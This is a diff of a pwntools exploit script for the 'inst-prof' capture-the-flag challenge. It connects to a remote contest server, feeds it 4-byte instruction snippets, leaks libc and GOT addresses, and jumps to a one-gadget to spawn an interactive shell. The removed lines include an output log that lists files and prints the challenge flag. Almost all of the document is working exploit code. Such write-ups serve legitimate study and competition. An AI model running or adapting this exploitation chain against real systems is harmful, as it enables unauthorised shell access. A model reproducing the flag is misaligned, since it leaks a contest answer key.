@@ -1,57 +1,116 @@
 #!/usr/bin/env python2
-# -*- coding: utf-8 -*-
-from pwn import *
+# -*- coding: utf8 -*-
+import argparse
 
+from pwn import *
 context(arch='amd64', os='linux')
 
-# by Francesco Cagnin, Marco Gasparini
+# by Francesco Cagnin aka integeruser and Marco Gasparini aka xire
+# of c00kies@venice
 
 
 def assemble(code):
-    return asm(code).ljust(4, '\x90')
+    bytecode = asm(code)
+    assert len(bytecode) <= 4, '"{}" assemble to more than 4 bytes'.format(code)
+    return bytecode.ljust(4, asm('ret'))
 
+def execute(instructions, recv=True):
+    if type(instructions) == str:
+        instructions = [instructions]
 
-def set_reg(reg, imm, tmp_reg):
+    conn.send(''.join(assemble(inst) for inst in instructions))
+    if recv:
+        return [unpack(conn.recvn(8)) for _ in range(len(instructions))]
+
+################################################################################
+
+def get_reg(reg):
     instructions = []
-    instructions.append('xor {tmp_reg:}, {tmp_reg:}; ret')
-    instructions.append('inc {tmp_reg:}; ret')
+
+    # leak the most significant 32 bits
+    instructions.append('sub r12, {reg:}; ret')
+
+    # leak the least significant 32 bits
+    for _ in range(32):
+        instructions.append('shl {reg:}, 1; ret')
+    instructions.append('sub r12, {reg:}; ret')
+
+    output = execute([inst.format(reg=reg) for inst in instructions])
+    hi_bits = output[0]  & 0xffffffff00000000
+    lo_bits = output[33] & 0xffffffff00000000
+    return hi_bits | (lo_bits >> 32)
+
+def set_reg(reg, imm, recv=True):
+    imm_bytes = []
+    while imm:
+        imm_bytes.insert(0, imm & 0xff)
+        imm >>= 8
+
+    instructions = list()
     instructions.append('xor {reg:}, {reg:}; ret')
 
-    while imm:
-        if imm & 1:
-            instructions.append('xor {reg:}, {tmp_reg:}; ret')
-        instructions.append('add {tmp_reg:}, {tmp_reg:}; ret')
-        imm >>= 1
+    for b in imm_bytes:
+        instructions.extend(['shl {reg:}, 1; ret']*8)
+        instructions.append('mov {{reg:}}b, 0x{b:02x}; ret'.format(b=b))
 
-    return [inst.format(reg=reg, tmp_reg=tmp_reg) for inst in instructions]
+    execute([inst.format(reg=reg) for inst in instructions], recv)
+
+################################################################################
+
+def leak_write_mmap_addr():
+    global conn
+    conn = remote('inst-prof.ctfcompetition.com', 1337)
+    conn.recvuntil('initializing prof...ready\n')
+
+    # find the address of _start
+    set_reg('r15', 0x20)
+    execute('mov r14, [rsp+r15]')
+
+    # calculate the address of the GOT table
+    start_offset = 0x8c9
+    gotplt_offset = 0x202000
+    set_reg('r15', -start_offset + gotplt_offset)
+    execute('add r14, r15')
+
+    # leak write() address
+    set_reg('r15', 0x18)
+    execute('add r14, r15')
+    execute('mov r13, [r14]')
+    write_addr = get_reg('r13')
+    print 'write_addr', hex(write_addr)
+
+    # leak mmap() address
+    set_reg('r15', 0x20-0x18)
+    execute('add r14, r15')
+    execute('mov r13, [r14]')
+    mmap_addr = get_reg('r13')
+    print 'mmap_addr', hex(mmap_addr)
+
+def main():
+    global conn
+    conn = remote('inst-prof.ctfcompetition.com', 1337)
+    conn.recvuntil('initializing prof...ready\n')
+
+    # find the address of __libc_start_main+245
+    set_reg('r15', 0x40)
+    execute('mov r14, [rsp+r15]')
+
+    # calculate the address of the chosen one-gadget and jump to it
+    libc_start_main_245_offset = 0x21f45
+    onegadget_offset = 0xe8fd5
+    set_reg('r15', -libc_start_main_245_offset + onegadget_offset)
+    execute('add r14, r15')
+    execute('call r14', recv=False)
+
+    conn.interactive()
 
 
-io = remote('inst-prof.ctfcompetition.com', 1337)
-io.recvuntil('initializing prof...ready\n')
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser()
+    parser.add_argument('-l', '--leak', action='store_true')
+    args = parser.parse_args()
 
-# leak a libc address from rsp+0x40 into r14
-for inst in set_reg('r15', 0x40, 'r13'):
-    io.send(assemble(inst))
-io.send(assemble('mov r14, [rsp+r15]'))
-
-# set r14 to libc base address
-for inst in set_reg('r15', 0x21f45, 'r13'):
-    io.send(assemble(inst))
-io.send(assemble('sub r14, r15; ret'))
-
-# call libc one-gadget
-for inst in set_reg('r15', 0xe8fd5, 'r13'):
-    io.send(assemble(inst))
-io.send(assemble('add r14, r15; ret'))
-io.send(assemble('call r14; ret'))
-
-io.interactive()
-
-# $ ./inst_prof.py
-# [+] Opening connection to inst-prof.ctfcompetition.com on port 1337: Done
-# [*] Switching to interactive mode
-# �\x00\x00\x00\x00\x00\x00�\x00\x00\x00\x00\x00\x00�\x00\x00\x00\x00z\x00\x00\x00\x00\x00\x00\x00\xbe\x00\x00\x00\x00\x00\x00\x00\x82\x00\x00\x00\x00\x00\x00\x00\x93\x00\x00\x00\x00\x00\x00�\x00\x00\x00\x00\x00\x00�\x00\x00\x00\x00\x00\x00\x95\x00\x00\x00\x00\x00\x00�\x00\x00\x00\x00\x00\x006\x10\x00\x00\x00\x00\x00\x00\x81\x00\x00\x00\x00\x00\x00Z\x00\x00\x00\x00\x00\x00}\x00\x00\x00\x00\x00\x00\x00t\x00\x00\x00\x00\x00\x00q\x00\x00\x00\x00\x00\x00�\x00\x00\x00\x00\x00\x82\x00\x00\x00\x00\x00\x00\x00T\x00\x00\x00\x00\x00\x00\xbd\x00\x00\x00\x00\x00\x00\x82\x00\x00\x00\x00\x00\x00\x00�\x00\x00\x00\x00\x00E\x00\x00\x00\x00\x00\x00�\x00\x00\x00\x00\x00\x00T\x00\x00\x00\x00\x00\x00�\x00\x00\x00\x00\x00i\x00\x00\x00\x00\x00\x00\\x00\x00\x00\x00\x00\x00b\x00\x00\x00\x00\x00\x00�\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00g\x00\x00\x00\x00\x00\x00g\x00\x00\x00\x00\x00\x00]\x00\x00\x00\x00\x00\x00q\x00\x00\x00\x00\x00\x00�\x00\x00\x00\x00\x00\x00\xb5\x00\x00\x00\x00\x00\x00\xb5\x00\x00\x00\x00\x00\x00s\x00\x00\x00\x00\x00\x00�\x00\x00\x00\x00\x00\x00\xbf\x00\x00\x00\x00\x00\x00\x82\x00\x00\x00\x00\x00\x00\x00�\x00\x00\x00\x00\x00\x00�\x00\x00\x00\x00\x00\x00\x82\x00\x00\x00\x00\x00\x00\x00�\x00\x00\x00\x00\x82\x00\x00\x00\x00\x00\x00\x00\x87\x00\x00\x00\x00\x00\x00\x00\x97\x00\x00\x00\x00\x00\x00\x00z\x00\x00\x00\x00\x00\x00\x00\xbc\x00\x00\x00\x00\x00\x00O\x00\x00\x00\x00\x00\x00�\x00\x00\x00\x00�\x00\x00\x00\x00\x00\x00\x85\x00\x00\x00\x00\x00\x00\x00_\x00\x00\x00\x00\x00\x00�\x00\x00\x00\x00\x00\x00�\x00\x00\x00\x00\x00�\x00\x00\x00\x00\x00\x00�\x00\x00\x00\x00\xad\x00\x00\x00\x00\x00\x00\x84\x00\x00\x00\x00\x00\x00\x00\xa4\x00\x00\x00\x00\x00\x00�\x00\x00\x00�\x00\x00\x00\x00�\x00\x00\x00\x00\x00\x00W\x00\x00\x00\x00\x00\x00\x85\x00\x00\x00\x00\x00\x00\x00Z\x00\x00\x00\x00\x00\x00�\x00\x00\x00\x00\x00�\x00\x00\x00\x00\x00\x8a\x00\x00\x00\x00\x00\x00\x00�\x00\x00\x00Z\x00\x00\x00\x00\x00\x00j\x00\x00\x00\x00\x00\x00B\x00\x00\x00\x00\x00\x00\x82\x00\x00\x00\x00\x00\x00\x00�\x00\x00\x00\x00\x00\x00�\x00\x00\x00\x00\x00\x00$ ls
-# flag.txt
-# inst_prof
-# $ cat flag.txt
-# CTF{0v3r_4ND_0v3r_4ND_0v3r_4ND_0v3r}
+    if args.leak:
+        leak_write_mmap_addr()
+    else:
+        main()
